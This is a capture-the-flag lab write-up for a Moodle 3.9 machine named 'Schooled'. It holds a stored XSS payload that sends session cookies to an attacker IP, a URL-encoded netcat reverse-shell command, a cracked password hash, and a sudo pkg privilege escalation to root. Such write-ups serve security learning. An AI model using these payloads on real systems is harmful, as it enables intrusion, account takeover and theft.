## Schooled

### Lab Details 

- Difficulty: Medium
- Type: Web App, Moodle, Stored XSS, Cookie Hijacking, File Upload, Hash Cracking, Priv Esc, Linux

#### Enumeration
- run nmap 
```
$ nmap -T4 -A -p- -Pn --min-rate=1000 -oN Schooled.nmap -Pn 10.10.10.234

PORT      STATE SERVICE    VERSION
22/tcp    open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp    open  tcpwrapped
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
33060/tcp open  tcpwrapped
```
- upon visiting the site we can find the domain name of the website at the footer of the page `schooled.htb` add that to `/etc/hosts`
- enumerate subdomain using `wfuzz`
```
$ wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.schooled.htb" --hh 20750 http://10.10.10.234
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.234/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                    
=====================================================================

000000162:   200        1 L      5 W        84 Ch       "moodle" 
```
- we get `moodle` as subdomain from server, add that to `/etc/hosts`
- upon visiting the website we get a login page to `moodle`
- we can attempt with registering an account 
- we get to see the dashboard once logged in
![[user_dashboard.png]]
- search online to find more on version of `moodle`, stack-overflow post (https://stackoverflow.com/questions/11548150/getting-moodle-version-info-no-admin-access) states we can check `http://moodle.schooled.htb/lib/upgrade.txt` which didnt work however `/moodle` is prefix for all pages we can assume that's the case for `upgrade.txt`, correct location: `http://moodle.schooled.htb/moodle/lib/upgrade.txt`
-  the version is 3.9 based on the `upgrade.txt`
- after going through the website we found there are couple of courses and each course has one teacher 
- going through each teacher's profile, each profile has `forum posts` which we can check to see what the teachers have been posting
![[Manuel_Philips.png]]
- we can see that teacher `Manuel Philips` has posted about manually checking `MoodleNet` for newly enrolled students to the Mathematics course
- we can attempt to exploit that see it the field is prone to `XSS`
- payload `<script>var i=new Image;i.src="http://10.10.16.14/?"+document.cookie;</script>`
- once we've injected payload into the `MoodleNet` in our profile we can attempt enrolling ourselves to the Mathematics course
- on attacker side we get the cookie of `Manuel Philips`
```
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.234 - - [24/Aug/2025 02:03:57] "GET /?MoodleSession=6ehd8nu1g8aqn22sjpml6te7pk HTTP/1.1" 200 -
```
- replace the existing cookie with the cookie of `Manuel Philips`
- we can then exploit CVE-2020-14321 (https://moodle.org/mod/forum/discuss.php?d=407393) to gain manager access to the course by adding an manager user to the course, in this case its `Lianne Carter` - more on this (https://0xaniket.medium.com/moodle-3-9-from-xss-to-account-takeover-to-rce-fc264e243b02)
- once we have manager access we will need to perform CVE-2020-25629 (https://moodle.org/mod/forum/discuss.php?d=410841) to login as `Lianne Carter`
- this can be achieved by add `Lianne Carter` to the course and then clicking on her profile then click on login as
- once we are logged in as `Lianne Carter` we will need to upload a ZIP file containing our payload to the server, payload: https://github.com/HoangKien1020/Moodle_RCE  - more on this (https://0xaniket.medium.com/moodle-3-9-from-xss-to-account-takeover-to-rce-fc264e243b02)
- once we have the payload we can access it via
```bash
$ curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id
uid=80(www) gid=80(www) groups=80(www)

## reverse shell
$ curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.16.14%204444%20%3E%2Ftmp%2Ff
```
#### Initial Foothold 
- once we have an RCE on the server we can then upgrade it to an interactive shell using `python`
```
$ /usr/local/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
```
- we have access of user `www`
- search online for `moodle` config file, its has name of `/moodle/config.php`
- we can search for it on the server and found `/usr/local/www/apache24/data/moodle/config.php`
#### Lateral Movement (If any)
- the `config.php` contains `mysql` credential 
- we can then attempt to login 
```
[www@Schooled /tmp]$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 moodle
```
- below is enumerating the database finding user `jamie`'s hash
```sql
moodle@localhost [moodle]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| moodle             |
+--------------------+
moodle@localhost [moodle]> use moodle;
use moodle;
Database changed
moodle@localhost [moodle]> show tables;
show tables;
<snip>
| mdl_upgrade_log                  |
| mdl_url                          |
| mdl_user                         |
| mdl_user_devices                 |
<snip>
moodle@localhost [moodle]> select * from mdl_user;
select * from mdl_user;
+----+---------------+-----------+--------------+---------+-----------+------------+-------------------+--------------------------------------------------------------+----------+-------------+-------------+----------------------------------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+-------------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+--------------+-----------------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+--------------------------------------------------------------------------------+
| id | auth          | confirmed | policyagreed | deleted | suspended | mnethostid | username          | password                                                     | idnumber | firstname   | lastname    | email                                  | emailstop | icq | skype | yahoo | aim | msn | phone1 | phone2 | institution | department | address | city        | country | lang | calendartype | theme | timezone | firstaccess | lastaccess | lastlogin  | currentlogin | lastip       | secret          | picture | url | description                                                               | descriptionformat | mailformat | maildigest | maildisplay | autosubscribe | trackforums | timecreated | timemodified | trustbitmask | imagealt | lastnamephonetic | firstnamephonetic | middlename | alternatename | moodlenetprofile                                                               |
+----+---------------+-----------+--------------+---------+-----------+------------+-------------------+--------------------------------------------------------------+----------+-------------+-------------+----------------------------------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+-------------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+--------------+-----------------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+--------------------------------------------------------------------------------+
<snip>
|  2 | manual        |         1 |            0 |       0 |         0 |          1 | admin             | $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW |          | Jamie       | Borham      | jamie@staff.schooled.htb               |         0 |     |       |       |     |     |        |        |             |            |         | Bournemouth | GB      | en   | gregorian    |       | 99       |  1608320129 | 1608729680 | 1608681411 |   1608729680 | 192.168.1.14 |                 |       0 |     |                                                                           |                 1 |          1 |          0 |           0 |             1 |           0 |           0 |   1608389236 |            0 |          |                  |                   |            |               |   
<snip>
```
- hash: `$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW`
- we can use `john` to crack it 
```
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:05 0.00% (ETA: 2025-08-25 13:32) 0g/s 130.0p/s 130.0c/s 130.0C/s daddy1..marissa
!QAZ2wsx         (?)     
1g 0:00:01:49 DONE (2025-08-24 02:51) 0.009137g/s 126.9p/s 126.9c/s 126.9C/s aldrich..superpet
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
- once we have it plain-text we can `ssh` to the server using `jamie`'s credential
#### Privilege Escalation
- run `sudo -l`
- we can run `pkg` as root 
```
jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```
- search `gtfo.bin` for `pkg`
- found below exploit
```bash
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
sudo pkg install -y --no-repo-update ./x-1.0.txz
```
- however `fpm` is not on the server
 ```bash
jamie@Schooled:~ $ fpm
-sh: fpm: not found
```
- we can install `fpm` and create the payload on our end and then transfer it cross using `scp`
```bash
jamie@Schooled:~ $ scp
usage: scp [-346BCpqrTv] [-c cipher] [-F ssh_config] [-i identity_file]
           [-l limit] [-o ssh_option] [-P port] [-S program] source ... target
jamie@Schooled:~ $ ls
user.txt        x-1.0.txz
jamie@Schooled:~ $ sudo pkg install -y --no-repo-update ./x-1.0.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. 'pkg update' required
Checking integrity... done (0 conflicting)
The following 1 package(s) will be affected (of 0 checked):

New packages to be INSTALLED:
        x: 1.0

Number of packages to be installed: 1
[1/1] Installing x-1.0...
```
- `nc` listener
```
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.14] from (UNKNOWN) [10.10.10.234] 48109
# whoami
root
```
#### Resources
- Install `fpm`: https://ipv6.rs/tutorial/Kali_Linux_Latest/fpm/

#### Lesson Learned
- use `wfuzz` for domain enumeration more accurate